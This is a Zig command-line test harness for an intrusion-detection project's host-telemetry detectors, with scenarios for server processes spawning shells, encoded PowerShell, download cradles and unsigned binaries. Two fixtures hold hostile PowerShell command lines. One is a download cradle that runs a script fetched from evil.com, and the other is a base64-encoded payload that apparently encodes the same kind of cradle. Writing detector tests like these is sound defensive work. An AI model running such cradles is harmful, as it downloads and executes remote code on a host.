// host_telemetry_detectors_cli.zig - AEGIS Phase 37 Ext 3: Enhanced Detection CLI.
// Builds with `zig build-exe host_telemetry_detectors_cli.zig -lc`.
//
// Modes:
//   help                              - this screen
//   demo                              - 8 scenarios + PASS/FAIL summary (exit 0)
//   scenario <name>                   - run a single named scenario
//
// Scenarios (each tests a specific detector):
//   kill-switch-off          - all detectors respect kill switch
//   web-server-shell         - w3wp -> cmd (T1190 pattern)
//   apache-shell             - httpd -> powershell (T1190 variant)
//   svchost-shell            - svchost -> cmd (T1078 pattern)
//   sql-server-shell         - sqlservr -> cmd (T1190 variant)
//   encoded-command          - powershell -enc <base64> (T1059)
//   download-cradle          - IEX Net.WebClient (T1059)
//   injection-temp           - unsigned in temp folder (T1055)
//   aggregator-multi         - multiple detectors fire on one event

const std = @import("std");
const ht = @import("host_telemetry.zig");
const det = @import("host_telemetry_detectors.zig");

pub fn main() !void {
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    const args = try std.process.argsAlloc(alloc);
    defer std.process.argsFree(alloc, args);

    std.debug.print("AEGIS NIDS - Phase 37 Ext 3: Enhanced Detection CLI\n", .{});
    std.debug.print("===================================================\n\n", .{});

    const mode: []const u8 = if (args.len >= 2) args[1] else "help";

    if (std.mem.eql(u8, mode, "help")) {
        printHelp();
        return;
    }

    if (std.mem.eql(u8, mode, "demo")) {
        const results = [_]struct { name: []const u8, ok: bool }{
            .{ .name = "kill-switch-off", .ok = scenarioKillSwitchOff() },
            .{ .name = "web-server-shell", .ok = scenarioWebServerShell() },
            .{ .name = "apache-shell", .ok = scenarioApacheShell() },
            .{ .name = "svchost-shell", .ok = scenarioSvchostShell() },
            .{ .name = "sql-server-shell", .ok = scenarioSqlServerShell() },
            .{ .name = "encoded-command", .ok = scenarioEncodedCommand() },
            .{ .name = "download-cradle", .ok = scenarioDownloadCradle() },
            .{ .name = "injection-temp", .ok = scenarioInjectionTemp() },
            .{ .name = "aggregator-multi", .ok = scenarioAggregatorMulti() },
        };
        var passed: usize = 0;
        for (results) |r| {
            const tag = if (r.ok) "PASS" else "FAIL";
            std.debug.print("  [{s}] {s}\n", .{ tag, r.name });
            if (r.ok) passed += 1;
        }
        std.debug.print("\n{d}/{d} scenarios passed\n", .{ passed, results.len });
        if (passed != results.len) std.process.exit(1);
        return;
    }

    if (std.mem.eql(u8, mode, "scenario")) {
        if (args.len < 3) {
            std.debug.print("Usage: host_telemetry_detectors_cli scenario <name>\n", .{});
            printHelp();
            return;
        }
        const name = args[2];
        const ok = runScenarioByName(name);
        const tag = if (ok) "PASS" else "FAIL";
        std.debug.print("\n  [{s}] {s}\n", .{ tag, name });
        if (!ok) std.process.exit(1);
        return;
    }

    std.debug.print("Unknown mode: {s}\n", .{mode});
    printHelp();
}

fn printHelp() void {
    std.debug.print("Usage:\n", .{});
    std.debug.print("  host_telemetry_detectors_cli help                          - this screen\n", .{});
    std.debug.print("  host_telemetry_detectors_cli demo                          - all 9 scenarios + summary\n", .{});
    std.debug.print("  host_telemetry_detectors_cli scenario <name>               - one scenario\n", .{});
    std.debug.print("\nScenario names (each tests a specific detector):\n", .{});
    std.debug.print("  kill-switch-off          - all detectors respect kill switch\n", .{});
    std.debug.print("  web-server-shell         - w3wp -> cmd (T1190 pattern)\n", .{});
    std.debug.print("  apache-shell             - httpd -> powershell (T1190 variant)\n", .{});
    std.debug.print("  svchost-shell            - svchost -> cmd (T1078 pattern)\n", .{});
    std.debug.print("  sql-server-shell         - sqlservr -> cmd (T1190 variant)\n", .{});
    std.debug.print("  encoded-command          - powershell -enc <base64> (T1059)\n", .{});
    std.debug.print("  download-cradle          - IEX Net.WebClient (T1059)\n", .{});
    std.debug.print("  injection-temp           - unsigned in temp folder (T1055)\n", .{});
    std.debug.print("  aggregator-multi         - multiple detectors fire on one event\n", .{});
}

fn runScenarioByName(name: []const u8) bool {
    if (std.mem.eql(u8, name, "kill-switch-off")) return scenarioKillSwitchOff();
    if (std.mem.eql(u8, name, "web-server-shell")) return scenarioWebServerShell();
    if (std.mem.eql(u8, name, "apache-shell")) return scenarioApacheShell();
    if (std.mem.eql(u8, name, "svchost-shell")) return scenarioSvchostShell();
    if (std.mem.eql(u8, name, "sql-server-shell")) return scenarioSqlServerShell();
    if (std.mem.eql(u8, name, "encoded-command")) return scenarioEncodedCommand();
    if (std.mem.eql(u8, name, "download-cradle")) return scenarioDownloadCradle();
    if (std.mem.eql(u8, name, "injection-temp")) return scenarioInjectionTemp();
    if (std.mem.eql(u8, name, "aggregator-multi")) return scenarioAggregatorMulti();
    std.debug.print("[ERR] unknown scenario: {s}\n", .{name});
    return false;
}

// --------------------------------------------------------------
// Scenario implementations
// --------------------------------------------------------------

fn scenarioKillSwitchOff() bool {
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = false });
    const ev = ht.HostEvent{ .event_type = .process_create, .pid = 1, .ppid = 0 };
    const result = agg.check(ev, "C:\\Windows\\System32\\w3wp.exe");
    const ok = result.count == 0;
    std.debug.print("  -> kill switch off; detection count={d}\n", .{result.count});
    return ok;
}

fn scenarioWebServerShell() bool {
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 5100,
        .ppid = 5000,
        .integrity = .system,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\cmd.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);

    const result = agg.check(ev, "C:\\Windows\\System32\\inetsrv\\w3wp.exe");
    const ok = result.count >= 1 and result.reasons[0] == .web_server_spawning_shell;
    std.debug.print("  -> w3wp -> cmd; reason[0]={s}, count={d}\n", .{
        result.reasons[0].toString(), result.count,
    });
    return ok;
}

fn scenarioApacheShell() bool {
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 200,
        .ppid = 100,
        .integrity = .medium,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);

    const result = agg.check(ev, "C:\\Apache\\bin\\httpd.exe");
    const ok = result.count >= 1 and result.reasons[0] == .web_server_spawning_shell;
    std.debug.print("  -> httpd -> powershell; reason[0]={s}\n", .{result.reasons[0].toString()});
    return ok;
}

fn scenarioSvchostShell() bool {
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 4100,
        .ppid = 4000,
        .integrity = .system,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\cmd.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);

    const result = agg.check(ev, "C:\\Windows\\System32\\svchost.exe");
    const ok = result.count >= 1 and result.reasons[0] == .service_host_spawning_shell;
    std.debug.print("  -> svchost -> cmd; reason[0]={s}\n", .{result.reasons[0].toString()});
    return ok;
}

fn scenarioSqlServerShell() bool {
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 3000,
        .ppid = 2900,
        .integrity = .high,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\cmd.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);

    const result = agg.check(ev, "C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\sqlservr.exe");
    const ok = result.count >= 1 and result.reasons[0] == .sql_server_spawning_shell;
    std.debug.print("  -> sqlservr -> cmd; reason[0]={s}\n", .{result.reasons[0].toString()});
    return ok;
}

fn scenarioEncodedCommand() bool {
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 2100,
        .ppid = 2000,
        .integrity = .medium,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const cmdline = "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=";
    @memcpy(ev.cmdline[0..cmdline.len], cmdline);
    ev.cmdline_len = @intCast(cmdline.len);

    const result = agg.check(ev, "C:\\Windows\\System32\\cmd.exe");

    var found = false;
    for (result.reasons[0..result.count]) |r| {
        if (r == .encoded_command_payload) found = true;
    }
    std.debug.print("  -> powershell -enc; encoded_payload_detected={}, count={d}\n", .{ found, result.count });
    return found;
}

fn scenarioDownloadCradle() bool {
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 2200,
        .ppid = 2100,
        .integrity = .medium,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const cmdline = "powershell -c IEX (New-Object Net.WebClient).DownloadString('https://evil.com/payload.ps1')";
    @memcpy(ev.cmdline[0..cmdline.len], cmdline);
    ev.cmdline_len = @intCast(cmdline.len);

    const result = agg.check(ev, null);

    var found = false;
    for (result.reasons[0..result.count]) |r| {
        if (r == .download_cradle) found = true;
    }
    std.debug.print("  -> IEX Net.WebClient; download_cradle_detected={}, count={d}\n", .{ found, result.count });
    return found;
}

fn scenarioInjectionTemp() bool {
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 1500,
        .ppid = 4,
        .integrity = .high,
        .is_signed = false,
    };
    const img = "C:\\Users\\Public\\taskhost.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);

    const result = agg.check(ev, null);

    var found = false;
    for (result.reasons[0..result.count]) |r| {
        if (r == .process_injection_virtual_alloc or r == .process_injection_write_memory) {
            found = true;
        }
    }
    std.debug.print("  -> unsigned in temp; injection_detected={}, count={d}\n", .{ found, result.count });
    return found;
}

fn scenarioAggregatorMulti() bool {
    // Combines web_server + encoded_command + (no injection, since cmd.exe in System32)
    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 5100,
        .ppid = 5000,
        .integrity = .system,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\cmd.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const cmdline = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=";
    @memcpy(ev.cmdline[0..cmdline.len], cmdline);
    ev.cmdline_len = @intCast(cmdline.len);

    const result = agg.check(ev, "C:\\Windows\\System32\\inetsrv\\w3wp.exe");

    // Expect 2 reasons: web_server_spawning_shell + encoded_command_payload
    const ok = result.count == 2 and
        result.reasons[0] == .web_server_spawning_shell and
        result.reasons[1] == .encoded_command_payload;
    std.debug.print("  -> multi-detection; reasons=[{s}, {s}], count={d}\n", .{
        result.reasons[0].toString(), result.reasons[1].toString(), result.count,
    });
    return ok;
}
